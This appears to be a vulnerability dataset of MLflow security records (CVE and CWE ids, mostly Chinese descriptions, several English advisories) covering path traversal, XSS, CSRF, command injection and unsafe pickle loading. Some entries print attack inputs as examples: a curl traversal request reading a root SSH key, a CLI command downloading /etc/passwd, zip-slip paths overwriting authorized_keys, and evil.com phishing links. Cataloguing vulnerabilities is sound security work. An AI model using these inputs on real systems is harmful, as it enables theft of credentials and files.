mlflow_mlflow,mlflow,,True,CVE-2023-6831,CWE-29 CWE-22,,Mlflow是一个开源的机器学习生命周期管理平台，旨在简化机器学习模型的开发和部署。在版本2.9.2之前，Mlflow存在路径遍历漏洞。该漏洞的根本原因是对文件处理机制中传入的特殊输入没有进行适当的检查。攻击者可以通过对路径的URL编码来绕过安全验证。利用该漏洞，攻击者可以在受害者服务器上删除任意文件，具体取决于用户的权限。,2,1
mlflow_mlflow,mlflow,,True,CVE-2023-6753,CWE-22,,Mlflow是一个机器学习生命周期的开源平台，旨在简化机器学习开发过程，包括跟踪实验、将代码打包成可重现的运行以及共享和部署模型。在Mlflow的2.9.2之前版本中，存在路径遍历漏洞，此漏洞源于在加载数据集时未能正确处理URL路径，允许攻击者通过操控URL路径中的文件名，利用后斜杠来绕过目录限制，实现写入当前工作目录以外的文件。例如，通过构造恶意URL，用户可以被诱骗加载攻击者指定的文件，从而造成任意文件写入。,1,1
mlflow_mlflow,mlflow,,True,CVE-2023-6709,CWE-1336,,Mlflow是一个机器学习生命周期的开源平台。该平台允许用户跟踪实验、打包代码为可重现的运行并共享和部署模型。Mlflow的2.9.2之前的版本存在安全漏洞，源于模板引擎中对特殊元素的处理不当。攻击者可以通过注入恶意输入到模板系统，从而在用户机器上执行任意代码。为了利用此漏洞，用户必须加载其在互联网上找到的配方配置。,1,1
mlflow_mlflow,mlflow,,True,CVE-2023-6568,CWE-79,,Mlflow 是一个开源机器学习生命周期管理平台，允许用户跟踪实验、打包代码以及共享和部署模型。受影响版本在 2.9.0 之前，存在跨站脚本漏洞。攻击者可以通过在 POST 请求的 Content-Type 头中注入恶意代码，这些代码在缺乏适当消毒或转义的情况下反射回用户。这可能导致用户会话被劫持、敏感信息被窃取或在用户代理的上下文中执行其他恶意操作。,3,1
mlflow_mlflow,mlflow,,True,CVE-2023-43472,CWE-200,2023-12-05,MLflow 是一个用于管理机器学习生命周期的开源平台，提供了实验追踪、模型管理、项目打包等功能。MLflow 2.8.1版本及之前的版本存在一个安全漏洞，原因是特制 REST API 请求的处理不当。攻击者可以通过发送特制的 REST API 请求来获取敏感信息。,2,1
mlflow_mlflow,mlflow,,True,CVE-2023-6014,CWE-598,,MLflow是一个开源的机器学习平台，旨在简化机器学习模型的开发和管理。此漏洞源于MLflow在其服务器和用户界面中实现基本身份验证的不当处理，允许攻击者绕过身份验证。具体而言，攻击者可以利用REST API创建用户/凭据集合，从而未授权访问模型、实验及系统中的其他重要数据。,1,1
mlflow_mlflow,mlflow,,True,CVE-2023-6015,CWE-22,,MLflow 是一个开源平台，用于简化机器学习开发，包括跟踪实验、将代码打包成可重现的运行并共享和部署模型。受影响的版本存在路径遍历漏洞，该漏洞源于在 `handlers.py` 中的检查被跳过。攻击者可以通过路径遍历攻击从 Windows 的根目录中突破，读取或写入主机上的敏感数据（可能包括 SSH 密钥）。此漏洞仅在 Windows 操作系统上可被利用，利用示例包括发送包含 `C:../` 的请求。,1,1
mlflow_mlflow,mlflow,,True,CVE-2023-1177,CWE-29 CWE-22,,MLflow是一个开源的平台，用于简化机器学习的开发，包括跟踪实验、将代码打包成可重复运行的方式以及共享和部署模型。在使用mlflow-server和mlflow-ui命令的情况下，存在路径遍历漏洞，攻击者可以利用此漏洞从主机服务器下载任意文件，包括与MLflow无关的文件。这一问题仅影响运行这些命令的用户，以及相关集成，比如在未受到限制的环境中使用此命令。,1,1
mlflow_mlflow,mlflow,,True,CVE-2022-0736,CWE-377,2022-02-23,"Mlflow是一个机器学习生命周期的开源平台。
Mlflow 中存在安全漏洞，该漏洞源于产品的tempfile.mktemp()函数未能正确处理多进程状态。攻击者可通过该漏洞创建同名临时文件。以下产品及版本受到影响：Mlflow 1.23.1 之前版本。",2,2
mlflow_mlflow,mlflow,,True,CVE-2023-4033,CWE-78,,Mlflow 是一个开源的机器学习生命周期管理平台，提供实验跟踪、模型管理等功能。版本 2.6.0 之前的 mlflow 存在操作系统命令注入漏洞。该漏洞的根本原因是 `backend.py` 文件中的 `predict()` 方法未能正确转义参数，导致攻击者可以向 `models predict` 操作的 CLI 参数中注入恶意命令。当系统使用不当时，攻击者能够执行任意操作系统命令。,2,1
mlflow_mlflow,mlflow,,True,CVE-2023-3765,CWE-36,,Mlflow 是一个开源的机器学习生命周期管理平台。受影响的版本在 validate_path_is_safe() 函数中存在路径遍历漏洞，导致对绝对 Windows 路径的处理不当。攻击者可以利用此漏洞列出、下载、写入和删除系统文件。此漏洞仅在运行 Windows 操作系统的主机上可被利用。,1,1
mlflow_mlflow,mlflow,,True,CVE-2023-1176,CWE-36,,MLflow 是一个开源的机器学习生命周期管理平台，旨在简化机器学习的开发过程，包括实验追踪、代码打包和模型共享及部署。如果使用早于 MLflow 2.2.1 的版本，且未限制谁可以查询其服务器，可能会受到远程文件存在检查漏洞的影响。该漏洞发生在运行 mlflow server 或 mlflow ui 命令时，由于未对模型名称进行适当验证，导致攻击者能够检查主机服务器上任意文件的存在性。,3,1
mlflow_mlflow,mlflow,,True,CVE-2024-3573,CWE-29 CWE-22,,Mlflow 是一个开源的机器学习开发平台，旨在简化模型的训练、注册和部署。该平台的漏洞源于其 `is_local_uri` 函数对 URI 的解析不当，使得攻击者能够绕过检查并读取系统上的任意文件。具体来说，该函数未能正确处理空或 'file' 方案的 URI，从而导致误判 URI 为非本地。利用此漏洞，攻击者可以通过创建恶意模型版本并巧妙构造 'source' 参数，读取到服务器根目录下至少两个目录层级内的敏感文件。,1,1
mlflow_mlflow,mlflow,,True,CVE-2024-1560,CWE-22,,Mlflow是一个机器学习生命周期的开源平台，旨在帮助用户简化机器学习模型的管理和部署。Mlflow 2.9.2版本存在路径遍历漏洞，该漏洞源于无法正确清理用户提供的路径，攻击者可以利用该漏洞删除服务器文件系统上的任意目录。该漏洞的根本原因是`local_artifact_repo.py`中的`delete_artifacts`函数存在额外的url反转操作，导致无法有效防止路径遍历序列的出现。攻击者可以利用`_delete_artifact_mlflow_artifacts`处理程序和`local_file_uri_to_path`函数中的双重解码过程来触发该漏洞。,2,1
mlflow_mlflow,mlflow,,True,CVE-2024-3848,CWE-29 CWE-22,,mlflow 是一个用于简化机器学习开发的开源平台，允许跟踪实验、将代码打包为可重现的运行，并分享和部署模型。受影响的版本 2.11.0 存在路径遍历漏洞，该漏洞源于对创建的 artifact URL 的片段部分验证不当。攻击者可以通过构造特定的 URL（使用 '#' 字符插入路径）来绕过验证，进而访问文件系统路径，从而读取任意文件，包括敏感信息如 SSH 和云密钥。,2,1
mlflow_mlflow,mlflow,,True,CVE-2024-4263,CWE-284,,Mlflow 是一个用于简化机器学习开发的开源平台，提供跟踪实验、将代码包装为可重复运行的代码以及共享和部署模型的功能。Mlflow 2.10.1 之前的版本在处理用户 EDIT 权限的 DELETE 请求时缺乏适当的验证，这导致低权限攻击者能够在未授权的情况下删除任何工件。这种漏洞的根本原因在于访问控制的错误实现，允许攻击者以其低权限删除包括目录在内的工件。这种不当访问控制使得原本只能读取和更新工件的用户能够进行删除操作。,3,1
mlflow_mlflow,mlflow,,True,CVE-2024-1558,CWE-22,,Mlflow 是一个机器学习生命周期的开源平台。该漏洞源于对 'source' 参数验证不当。在 `_create_model_version` 函数中，攻击者可以发送特制的 `source` 参数，绕过 `_validate_non_local_source_contains_relative_paths(source)` 函数的检查，从而获得对服务器上任意文件的读取访问权限。这一问题源于处理未加引号的URL字符及在模型版本创建时错误地使用原始 'source' 值，导致在与 `/model-versions/get-artifact` 处理程序交互时敏感文件暴露。,2,1
mlflow_mlflow,mlflow,,True,CVE-2024-1483,CWE-22,,Mlflow 是一个开源的机器学习生命周期管理平台，旨在简化机器学习开发过程，包括跟踪实验、打包代码并分享和部署模型。Mlflow 2.9.2版本存在路径遍历漏洞，该漏洞源于对用户输入验证不足。攻击者可以通过构造特定的HTTP POST请求，利用 'artifact_location' 和 'source' 参数，使用包含 '#' 组件的本地URI，访问服务器上的任意文件。这种攻击利用了目录遍历，允许攻击者访问服务器上不应被公开的文件。,2,1
mlflow_mlflow,mlflow,,True,CVE-2024-1593,CWE-22,,Mlflow是一个机器学习生命周期的开源平台。该平台用于简化机器学习开发，包括实验跟踪、将代码打包为可重复运行的程序以及共享和部署模型。Mlflow存在路径遍历漏洞，该漏洞源于对URL参数处理不当。攻击者可以利用;字符在URL中传递路径遍历序列，从而操控URL的params部分，获得对系统中文件或目录的未授权访问。攻击者可以使用像'../'这样的路径序列，访问存储在文件系统中任意的文件或目录。,2,1
mlflow_mlflow,mlflow,,True,CVE-2024-1594,CWE-22,,Mlflow是一个机器学习生命周期的开源平台。该漏洞存在于Mlflow 2.9.2版本及更早版本中，攻击者可以利用该漏洞在创建实验时，通过操纵'artifact_location'参数来触发路径遍历攻击。在URI中使用片段组件'#'，攻击者可以读取服务器上任意文件。这个漏洞类似于CVE-2023-6909，但利用了URI中的不同组件来达到相同效果。,2,1
mlflow_mlflow,mlflow,,True,CVE-2023-6018,CWE-78,,MLflow 是一个开源的平台，用于简化机器学习的开发流程，包括实验的跟踪、代码的封装和模型的共享与部署。在受到影响的版本中，通过对 `/ajax-api/2.0/mlflow/model-versions/create` 的请求，存在操作系统命令注入漏洞。攻击者可以利用此漏洞覆盖 MLflow 服务器上的任意文件，从而在受影响的机器上执行命令并获取数据和模型信息。,1,1
mlflow_mlflow,mlflow,,True,CVE-2024-6838,CWE-400,,MLflow是一个开源的机器学习开发平台，旨在简化机器学习项目的管理，提供实验跟踪、模型部署等功能。在MLflow版本v2.13.2中，由于实验名称缺少限制，存在安全漏洞，允许创建或重命名实验时使用大量整数，这可能导致MLflow用户界面失去响应，从而导致拒绝服务。此外，在创建实验时，`artifact_location`参数也没有字符限制。,3,1
mlflow_mlflow,mlflow,,True,CVE-2025-0453,CWE-410,,MLFlow 是一个开源的机器学习平台，旨在简化机器学习工作流的管理。在 MLFlow 版本 2.17.2 中，`/graphql` 端点存在拒绝服务攻击（DoS）的漏洞。攻击者可以创建大量复杂的查询批次，反复请求特定实验下的所有运行记录，导致 MLFlow 分配的所有工作者被大量请求占用，无法响应其他请求。这一漏洞源于对资源消耗的未受控管理。,2,1
mlflow_mlflow,mlflow,,True,CVE-2025-52967,CWE-918,2025-06-23,MLflow是一款用于管理机器学习生命周期的开源平台，涵盖了实验跟踪、项目部署和模型管理等功能。该漏洞涉及MLflow中的gateway_proxy_handler组件，该组件负责处理网关路径请求，然而在版本3.1.0之前，其路径验证功能存在缺失。这种缺陷使得某些未经验证的输入可以通过此组件传递，可能导致非法请求被接收和处理。,3,2
mlflow_mlflow,mlflow,,True,CVE-2024-27134,CWE-276 CWE-367,2024-11-25,MLflow 是一个开源的平台，旨在简化机器学习开发，它包括了管理和跟踪实验、将代码打包成可重复的运行以及共享和部署模型的能力。在 MLflow 中，由于目录权限设置过多，使用 spark_udf 功能时存在本地特权升级的漏洞。这意味着攻击者可以通过利用这一漏洞获得更高的系统权限，从而执行未授权的操作。,2,0
mlflow_mlflow,mlflow,,True,CVE-2025-1473,CWE-352,,mlflow 是一个开源的机器学习平台，旨在管理机器学习生命周期的各个方面，包括实验跟踪、项目包装和模型部署。在版本 2.17.0 到 2.20.1 的注册功能中，存在跨站请求伪造（CSRF）漏洞。攻击者可以利用这一漏洞创建新账户，从而可在恶意用户的名义下执行未经授权的操作。这一漏洞的根本原因是对 CSRF 攻击缺乏足够的防护和验证，特别是在处理用户注册请求时。,2,1
mlflow_mlflow,mlflow,,True,CVE-2024-8859,CWE-29,,MLflow是一个开源的平台，旨在简化机器学习开发，包括跟踪实验、打包代码和共享模型。在MLflow的2.15.1版本中，发现了一个路径遍历漏洞，该漏洞源于dbfs服务的不当配置。具体而言，漏洞发生在`_validate_non_local_source_contains_relative_paths()`函数中，当`dbfs`服务被配置并挂载到本地目录而不是Databricks时，攻击者可以通过操纵`file:`协议中的URL读取任意文件，因为该实现未能适当清理路径之外的输入，如查询和参数。,2,1
mlflow_mlflow,mlflow,,True,CVE-2025-1474,CWE-521,,在 MLflow 版本 2.18 中，管理员可以在未设置密码的情况下创建新用户账户。MLflow 是一个开源的机器学习平台，旨在简化机器学习的开发和管理。由于缺乏对设置密码的要求，该漏洞可能导致未授权访问，从而引发安全风险。此外，这一做法违反用户账户安全管理的最佳实践。该漏洞已在版本 2.19.0 中修复。,3,1
mlflow_mlflow,mlflow,,True,,,,<p>mlflow 是一个用于机器学习项目的开源平台，提供实验跟踪、模型管理等功能。在测试过程中发现，当用户访问日志中的 PDF 工件时，存在定制 JavaScript 执行的漏洞。该漏洞是由项目的默认安装中使用的易受攻击的 PDFjs 封装导致的。攻击者可以通过上传特制的 PDF 文件来引发 JavaScript 的执行，从而影响其他用户。</p>,3,1
mlflow_mlflow,mlflow,,True,,,,<p>mlflow是一个开源的机器学习平台，允许数据科学家和开发者使用不同的工具进行机器学习模型的构建和管理。在AWS上，发现一个未被声明的S3存储桶，攻击者可以声称这个存储桶并获得对它的控制权。这种漏洞的根本原因是对S3存储桶的管理不当，导致存储桶处于可被恶意接管的状态。攻击者可通过直接访问未声明的S3存储桶地址，执行接管操作。</p>,2,1
mlflow_mlflow,mlflow,,True,,,,<p>mlflow 是一个开源的机器学习平台，用于管理机器学习项目的整个生命周期，包括实验、重现和部署。该漏洞存在于 Github Actions 的工作流中，攻击者可以提交包含可执行代码的恶意 Pull Request，这些代码在没有适当授权的情况下执行，从而导致敏感令牌泄露并危及代码库的安全。</p>,1,1
mlflow_mlflow,mlflow,,True,,,,<p>mlflow 是一个开源的机器学习平台，旨在帮助数据科学家和开发人员管理机器学习生命周期。该漏洞存在于创建实验与模型的功能中，攻击者可以利用跨站请求伪造（CSRF）攻击来在未授权用户的情况下创建实验和模型。具体来说，当用户访问精心构造的网页时，该攻击可以自动提交请求以创建新的模型，如“test”。</p>,3,1
mlflow_mlflow,mlflow,,True,,,,<p>MLFlow 是一个用于机器学习操作的程序，允许工程师运行、记录和重现他们的实验与模型。当攻击者利用符号链接和日志记录功能时，可能导致内部机密文件的曝光。漏洞的根本原因在于使用 Python 的 `with open` 函数，在处理符号链接的过程中不当处理导致泄露。如果攻击者成功提取了符号链接的归档文件并存储在跟踪服务器上，就能够利用 MLFlow API 获取相关文件。一旦攻击者获得 SSH 密钥，则可能导致对其他模型及其相关数据的访问。</p>,3,1
mlflow_mlflow,mlflow,,True,,,,<p>mlflow 是一个开源的机器学习平台，用于管理机器学习项目的开发、实验和部署。当一个页面未能设置适当的 X-Frame-Options 或 Content-Security-Policy HTTP 头时，攻击者可以在其控制的页面中通过 iframe 加载受影响的页面。这种漏洞的根本原因在于缺乏必要的防护措施。攻击者可通过在用户的浏览器中叠加一个虚假的用户界面，诱使受害者进行诸如鼠标点击和键盘输入等操作，进而在被攻击的应用中无意执行指令。</p>,4,1
mlflow_mlflow,mlflow,,True,,,,<p>mlflow 是一个开源的机器学习生命周期管理工具，允许用户追踪实验、项目和最终模型。在使用 mlflow cli 命令下载工件时，存在本地文件包含漏洞，攻击者可以通过提供不安全的 URI 来下载服务器上任何位置的文件。攻击者可以利用这一漏洞，执行类似 'mlflow artifacts download -u /etc/passwd -d /home/ubuntu/test/' 的命令，将 /etc/passwd 的内容下载到本地目录，从而暴露敏感信息。</p>,2,1
mlflow_mlflow,mlflow,,True,,,,"<p>mlflow是一个开源的机器学习平台，旨在简化并优化机器学习模型的管理和部署。当使用`dangerouslySetInnerHTML`方法渲染用户输入的内容时，如果未采取适当的输入验证，就会导致HTML注入漏洞。攻击者可以通过存储恶意HTML代码创建假网页，例如使用标记<a href=""http://evil.com"" rel=""noopener noreferrer"" target=""_blank"">click here to get gift</a>来实施钓鱼攻击，将受害者重定向到另一个网站。</p>",3,1
mlflow_mlflow,mlflow,,True,,,,<p>mlflow是一个用于机器学习生命周期管理的开源平台，支持多种机器学习模型的实验跟踪、项目管理和模型部署。该漏洞源于使用pickle.load函数不当，攻击者可以借此加载恶意构造的pickle文件。当用户从互联网下载一个模型并使用该框架检查模型训练结果时，可能会触发代码执行。具体的执行流程是，当检查'train'步骤时，会调用inspect函数，继而调用BaseCard.load方法加载卡片模型，这一过程可能导致任意代码执行。</p>,3,1
mlflow_mlflow,mlflow,,True,,,,<p>mlflow 是一个开源的机器学习生命周期管理平台，允许用户轻松地构建和管理机器学习模型。该漏洞的根本原因在于 mlflow 在加载模型时使用了 Python 的原生 Unpickler，该组件对反序列化攻击存在脆弱性，允许恶意模型通过隐藏有效载荷来执行任意代码，包括操作系统命令。由于这一脆弱性，不仅在 mlflow.pyfunc.load_model 中存在，在 mlflow 的多个其他位置，如 mlflow.sklearn.load_model 和 mlflow.pytorch.pickle_module.py 中也有类似问题。</p>,2,1
mlflow_mlflow,mlflow,,True,,,,<p>MLflow 是一个开源的机器学习平台，旨在帮助数据科学家和开发者管理整个机器学习生命周期。该漏洞存在于用户输入未被恰当验证和清理的情况下，导致攻击者能够通过 XSS 注入虚假的登录表单或欺骗性用户界面到合法网页中。攻击者可以在这些虚假表单中窃取敏感信息，例如用户名、密码或信用卡详细信息。具体地，在使用 `render_template_string` 函数时，如不对用户输入进行适当转义，用户控制的值即可能成为 JavaScript 代码的来源，最终导致跨站脚本攻击的发生。</p>,3,1
mlflow_mlflow,mlflow,,True,,,,<p>MLflow 是一个开源平台，用于管理机器学习生命周期，包括实验跟踪、项目打包和模型管理。在创建实验时，当使用 POST 请求向 /ajax-api/2.0/mlflow/experiments/create 发送包含相同名称的实验的请求时，系统原本应该检查该实验名称是否已经存在，并返回错误信息。然而，由于存在竞争条件，多个同时请求可以成功创建相同名称的实验。这种漏洞的根源在于对并发请求的处理不当，导致了一致性问题和安全隐患。</p>,3,1
mlflow_mlflow,mlflow,,True,,,,<p>mlflow 是一个用于管理机器学习生命周期的开源平台，它提供模型训练、记录和模型部署的功能。当用户上传数据集时，由于使用 MD5 哈希值作为数据集标识符，可能导致哈希冲突，从而阻止新的数据集上传。攻击者可以利用此漏洞，通过提前创建具有相同名称和内容的已知数据集，从而占用相应的MD5哈希值，导致其他用户无法上传同名数据集。</p>,3,1
mlflow_mlflow,mlflow,,True,,,,"<p>MLflow 是一个用于管理机器学习生命周期的开源平台，支持实验记录、模型部署和系列管理。该平台存在HTML/XSS注入漏洞，攻击者可以通过在网页表单或输入字段中注入恶意代码，从而使用户在浏览网页时被重定向到恶意网站。攻击者可以利用该漏洞通过修改描述字段来注入HTML代码，例如用 <a href=""http://evil.com"" rel=""noopener noreferrer"" target=""_blank"">submit your report here </a>，从而实现用户重定向。在用户保存后，该链接将出现在用户界面上，点击后会将用户重定向到恶意网站。</p>",2,1
mlflow_mlflow,mlflow,,True,,,,<p>MLflow 是一个开源的平台，旨在为机器学习项目提供管理和部署服务。该漏洞影响版本 2.5.0。由于在模型版本创建过程中未能正确处理输入参数，攻击者可以利用该漏洞向其他用户的账户注入恶意脚本。具体来说，攻击者在创建模型版本时，设置的运行链接（run_link）参数可以包含 JavaScript 代码。当受害者用户访问该链接时，恶意脚本将在其浏览器中执行，从而导致信息泄露或账户控制。</p>,2,1
mlflow_mlflow,mlflow,,True,,,,<p>mlflow 是一个用于机器学习项目的开源平台，提供了模型登记、追踪实验和模型部署等功能。该漏洞存在于 mlflow 的文件操作中，攻击者可以通过重写 YAML 文件中的敏感字段，导致远程代码执行或本地文件读取。具体来说，当调用 `write_yaml()` 函数并设置 `overwrite=True` 时，系统未能正确验证文件内容的有效性，攻击者能够覆盖关键属性如 `source` 和 `storage_location`，并在多种情况下利用此漏洞。</p>,1,1
mlflow_mlflow,mlflow,,True,CVE-2025-11201,CWE-22,2025-10-29,MLflow Tracking Server 是一个用于管理机器学习模型生命周期的开源平台，包括实验记录、模型注册和模型部署等功能。在该漏洞中，受影响组件在处理模型文件路径时，缺乏对用户输入路径的正确验证，导致攻击者能够构造恶意路径并触发文件操作。这种漏洞通常是由于未正确验证输入数据或未限制目录访问范围所引起的。攻击者可以利用构造的路径执行任意代码，具体地是在服务账户的权限上下文中执行代码。,1,2
mlflow_mlflow,scikit-learn,1.4.2,True,CVE-2024-5206,CWE-921 CWE-922,,scikit-learn 是一个基于 Python 的开源机器学习模块，支持数据挖掘和数据分析等功能。该漏洞源于 TfidfVectorizer 类在处理训练数据时，意外地将所有标记存储在 stop_words_ 属性中，而非仅存储进行 TF-IDF 计算所需的令牌子集。这种行为可能导致敏感信息泄露，例如密码或密钥，因为 stop_words_ 属性中可能包含本应被丢弃的标记。,3,1
mlflow_mlflow,mlflow,,True,CVE-2024-0520,CWE-22,,Mlflow是一个开源的平台，用于简化机器学习开发的生命周期，包括实验跟踪、代码打包和模型共享与部署。该漏洞源于`mlflow.data.http_dataset_source.py`模块中操作系统命令的特殊元素未得到正确中和，攻击者可以通过操控`Content-Disposition`头部中的文件名或URL路径包含恶意输入来执行任意代码。此漏洞允许攻击者完全控制文件路径，通过路径遍历或绝对路径技术，实现任意文件写入，例如用'../../tmp/poc.txt'或'/tmp/poc.txt'。,1,1
mlflow_mlflow,mlflow,,True,CVE-2024-3099,CWE-475,,Mlflow 是一个用于简化机器学习开发的开源平台，支持跟踪实验、打包可重复的运行和共享与部署模型。该漏洞源于对模型名称的验证不足，允许攻击者通过 URL 编码创建多个同名模型，因此可能导致拒绝服务（DoS），同时攻击者还可以利用此漏洞对数据模型进行污染。由于 URL 编码的模型在处理时被视为与其解码版本不同，从而导致了这一安全问题。,3,1
mlflow_mlflow,mlflow,,True,CVE-2024-2928,CWE-29 CWE-22,,MLflow 是一个开源的机器学习生命周期管理平台，旨在简化机器学习开发过程，包括实验跟踪、代码打包以及模型的共享与部署。该平台存在安全漏洞，主要由于在解析 URI 片段时未能妥善验证其内容。攻击者可以通过操纵 URI 片段的部分，利用目录遍历序列如 '../' 来读取本地文件系统上的任意文件，甚至包括敏感文件如 '/etc/passwd'。该漏洞是对之前补丁的绕过，表明需要对 URI 的所有部分进行全面验证以防止本地文件包含攻击。,2,1
mlflow_mlflow,mlflow,,True,,,2023-05-01,"### Impact

Users of the MLflow Open Source Project who are hosting the MLflow Model Registry using the ``mlflow server`` or ``mlflow ui`` commands using an MLflow version older than **MLflow 2.3.1** may be vulnerable to a remote file access exploit if they are not limiting who can query their server (for example, by using a cloud VPC, an IP allowlist for inbound requests, or authentication / authorization middleware).

This issue only affects users and integrations that run the ``mlflow server`` and ``mlflow ui`` commands. Integrations that do not make use of ``mlflow server`` or ``mlflow ui`` are unaffected; for example, the Databricks Managed MLflow product and MLflow on Azure Machine Learning do not make use of these commands and are not impacted by these vulnerabilities in any way.

The vulnerability is very similar to https://nvd.nist.gov/vuln/detail/CVE-2023-1177, and a separate CVE will be published and updated here shortly.

### Patches

This vulnerability has been patched in MLflow 2.3.1, which was released to PyPI on April 27th, 2023. If you are using ``mlflow server`` or ``mlflow ui`` with the MLflow Model Registry, we recommend upgrading to MLflow 2.3.1 as soon as possible.

### Workarounds
If you are using the MLflow open source ``mlflow server`` or ``mlflow ui`` commands, we strongly recommend limiting who can access your MLflow Model Registry and MLflow Tracking servers using a cloud VPC, an IP allowlist for inbound requests, authentication / authorization middleware, or another access restriction mechanism of your choosing.

If you are using the MLflow open source ``mlflow server`` or ``mlflow ui`` commands, we also strongly recommend limiting the remote files to which your MLflow Model Registry and MLflow Tracking servers have access. For example, if your MLflow Model Registry or MLflow Tracking server uses cloud-hosted blob storage for MLflow artifacts, make sure to restrict the scope of your server's cloud credentials such that it can only access files and directories related to MLflow.

### References
",1,-2
mlflow_mlflow,mlflow,,True,,CWE-23,2023-05-04,"## Overview
[mlflow](https://pypi.org/project/mlflow/) is a platform to streamline machine learning development, including tracking experiments, packaging code into reproducible runs, and sharing and deploying models.

Affected versions of this package are vulnerable to Relative Path Traversal due to allowing the ability to provide relative paths in registered model sources. 

**Note:**

This issue only affects users and integrations that run the `mlflow server` and `mlflow ui` commands. Integrations that do not make use of `mlflow server` or `mlflow ui` are unaffected; for example, the Databricks Managed MLflow product and MLflow on Azure Machine Learning do not make use of these commands and are not impacted by these vulnerabilities in any way.

## Workaround

Users who are unable to upgrade to the fixed version should limit who can access MLflow Model Registry and MLflow Tracking servers using a cloud VPC, an IP allowlist for inbound requests, authentication / authorization middleware, or another access restriction mechanism.
## Remediation
Upgrade `mlflow` to version 2.3.1 or higher.
## References
- [GitHub Commit](https://github.com/mlflow/mlflow/commit/f73147496e05c09a8b83d95fb4f1bf86696c6342)
- [GitHub Issue](https://github.com/mlflow/mlflow/issues/8273)
- [GitHub PR](https://github.com/mlflow/mlflow/pull/8281)
- [GitHub Release](https://github.com/mlflow/mlflow/releases/tag/v2.3.1)
",1,2
mlflow_mlflow,mlflow,,True,,CWE-284,2023-05-02,"## Overview
[mlflow](https://pypi.org/project/mlflow/) is a platform to streamline machine learning development, including tracking experiments, packaging code into reproducible runs, and sharing and deploying models.

Affected versions of this package are vulnerable to Access Restriction Bypass. Users of the MLflow Open Source Project who are hosting the MLflow Model Registry using the `mlflow server` or `mlflow ui` commands  may be vulnerable to a remote file access exploit if they are not limiting who can query their server (for example, by using a cloud VPC, an IP allowlist for inbound requests, or authentication / authorization middleware).

This issue only affects users and integrations that run the ``mlflow server`` and ``mlflow ui`` commands. Integrations that do not make use of ``mlflow server`` or ``mlflow ui`` are unaffected; for example, the Databricks Managed MLflow product and MLflow on Azure Machine Learning do not make use of these commands and are not impacted by these vulnerabilities in any way. The vulnerability is very similar to [CVE-2023-1177](https://security.snyk.io/vuln/SNYK-PYTHON-MLFLOW-3373049)

## Workarounds
If you are using the MLflow open source `mlflow server` or `mlflow ui` commands, we strongly recommend limiting who can access your MLflow Model Registry and MLflow Tracking servers using a cloud VPC, an IP allowlist for inbound requests, authentication / authorization middleware, or another access restriction mechanism of your choosing.

If you are using the MLflow open source `mlflow server` or `mlflow ui` commands, we also strongly recommend limiting the remote files to which your MLflow Model Registry and MLflow Tracking servers have access. For example, if your MLflow Model Registry or MLflow Tracking server uses cloud-hosted blob storage for MLflow artifacts, make sure to restrict the scope of your server's cloud credentials such that it can only access files and directories related to MLflow.
## Remediation
Upgrade `mlflow` to version 2.3.1 or higher.
## References
- [GitHub PR](https://github.com/mlflow/mlflow/pull/8281)
",1,2
mlflow_mlflow,mlflow,,True,,CWE-22,2023-07-02,"## Overview
[mlflow](https://pypi.org/project/mlflow/) is a platform to streamline machine learning development, including tracking experiments, packaging code into reproducible runs, and sharing and deploying models.

Affected versions of this package are vulnerable to Directory Traversal via the function `_validate_non_local_source_contains_relative_paths` due to improper validation of the 'source' parameter.

## Details

A Directory Traversal attack (also known as path traversal) aims to access files and directories that are stored outside the intended folder. By manipulating files with ""dot-dot-slash (../)"" sequences and its variations, or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system, including application source code, configuration, and other critical system files.

Directory Traversal vulnerabilities can be generally divided into two types:

- **Information Disclosure**: Allows the attacker to gain information about the folder structure or read the contents of sensitive files on the system.

`st` is a module for serving static files on web pages, and contains a [vulnerability of this type](https://snyk.io/vuln/npm:st:20140206). In our example, we will serve files from the `public` route.

If an attacker requests the following URL from our server, it will in turn leak the sensitive private key of the root user.

```
curl http://localhost:8080/public/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/root/.ssh/id_rsa
```
**Note** `%2e` is the URL encoded version of `.` (dot).

- **Writing arbitrary files**: Allows the attacker to create or replace existing files. This type of vulnerability is also known as `Zip-Slip`. 

One way to achieve this is by using a malicious `zip` archive that holds path traversal filenames. When each filename in the zip archive gets concatenated to the target extraction folder, without validation, the final path ends up outside of the target folder. If an executable or a configuration file is overwritten with a file containing malicious code, the problem can turn into an arbitrary code execution issue quite easily.

The following is an example of a `zip` archive with one benign file and one malicious file. Extracting the malicious file will result in traversing out of the target folder, ending up in `/root/.ssh/` overwriting the `authorized_keys` file:

```
2018-04-15 22:04:29 .....           19           19  good.txt
2018-04-15 22:04:42 .....           20           20  ../../../../../../root/.ssh/authorized_keys
```

## Remediation
Upgrade `mlflow` to version 2.4.1 or higher.
## References
- [GitHub ChangeLog](https://github.com/mlflow/mlflow/blob/6701fca95c8ee9ce1712c09a5291b0531c2fb108/CHANGELOG.md?plain=1#L14)
- [GitHub PR](https://github.com/mlflow/mlflow/pull/8648)
",2,2
mlflow_mlflow,mlflow,,True,CVE-2023-2780,CWE-29,,mlflow 是一个开源的机器学习生命周期管理平台，旨在简化机器学习模型的开发和部署。该漏洞源于 mlflow 没有正确验证来源的 URL，导致攻击者能够通过相对路径访问预期目录之外的文件并读取任意文件。攻击者可以使用形如 'file://./etc/' 的字符串绕过检查，从而下载与 mlflow 无关的任意文件，包括服务器上已存储的敏感文件。,1,1
mlflow_mlflow,mlflow,,True,CVE-2023-30172,CWE-22,2023-05-10,"Mlflow是一个机器学习生命周期的开源平台。
Mlflow v2.0.1版本及之前版本存在安全漏洞。攻击者利用该漏洞可以通过path参数读取服务器上的任意文件。",2,2
mlflow_mlflow,mlflow,,True,CVE-2023-2356,CWE-23,,MLflow 是一个开源的机器学习平台，用于管理机器学习项目、跟踪实验、构建模型和部署代码。MLflow 在 2.3.1 版本之前存在文件读取漏洞。攻击者在请求 /api/2.0/mlflow/registered-models/create 路由时可以通过 source 参数指定路径，随后利用 /model-versions/get-artifact 路由读取任意文件内容，可能导致敏感信息泄露。,2,1
mlflow_mlflow,mlflow,,True,CVE-2024-27133,CWE-79,2024-02-23,"Mlflow是一个机器学习生命周期的开源平台。
Mlflow 存在跨站脚本漏洞，该漏洞源于缺乏对 dataset table字段的清理，导致跨站脚本。",2,0
mlflow_mlflow,mlflow,,True,CVE-2024-27132,CWE-79,2024-02-23,"Mlflow是一个机器学习生命周期的开源平台。
Mlflow 存在跨站脚本漏洞，该漏洞源于缺乏对 template变量的清理，导致跨站脚本。",2,0
